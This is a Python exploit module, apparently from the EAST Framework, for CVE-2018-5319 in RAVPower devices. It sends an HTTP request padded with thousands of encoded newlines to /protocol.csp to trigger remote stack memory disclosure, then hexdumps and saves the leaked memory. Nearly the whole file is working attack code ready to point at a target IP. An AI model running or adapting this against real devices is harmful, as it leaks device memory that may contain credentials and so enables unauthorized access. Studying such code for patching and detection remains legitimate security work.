#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import re
import socket
import datetime

sys.path.append("./core")
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_ravpower_dos"
INFO['DESCRIPTION'] = "RAVPower 2.000.056 - Memory Disclosure"
INFO['VENDOR'] = "https://www.ravpower.com/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/43856/']
INFO["CVE Name"] = "CVE-2018-5319"
INFO["NOTES"] = """Remote stack disclosure
"""

INFO['CHANGELOG'] = "23 Jan, 2018. Written by Gleg team."
INFO['PATH'] = 'Exploits/Hatdware/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '127.0.0.1', dict(description = 'Target IP')
#OPTIONS["PORT"] = 69

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        #self.port = int(self.args.get('PORT', self.port))
        self.host = self.args.get('HOST', self.host)
    
    def redall(self, s):
        tmp = s.recv(1)
        while not str(tmp).endswith("<errno>"):
            tmp += s.recv(1)
            print tmp
        tmp = str(tmp).split("\r\n\r\n",1)[1]
        return re.sub("[\x0a]+", "", tmp, 100)
    
    def hexdump(src, length=16):
        FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
        lines = []
        for c in xrange(0, len(src), length):
            chars = src[c:c + length]
            hex = ' '.join(["%02x" % ord(x) for x in chars])
            printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
            lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
        return ''.join(lines)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        packet = "GET /protocol.csp?fname=a&opt=%s&function=get HTTP/1.1\r\nConnection: close\r\nHost: {0}\r\n\r\n".format(self.host)
        packet = packet % ("%0a" * 12241)
        
        result = ''
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.host, 80))
            s.sendall(packet)
            result = self.redall(s)
        except Exception as e:
            self.log(e)
            self.finish(False)
        
        self.log(self.hexdump(result))
        self.writefile(self.hexdump(result))        
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
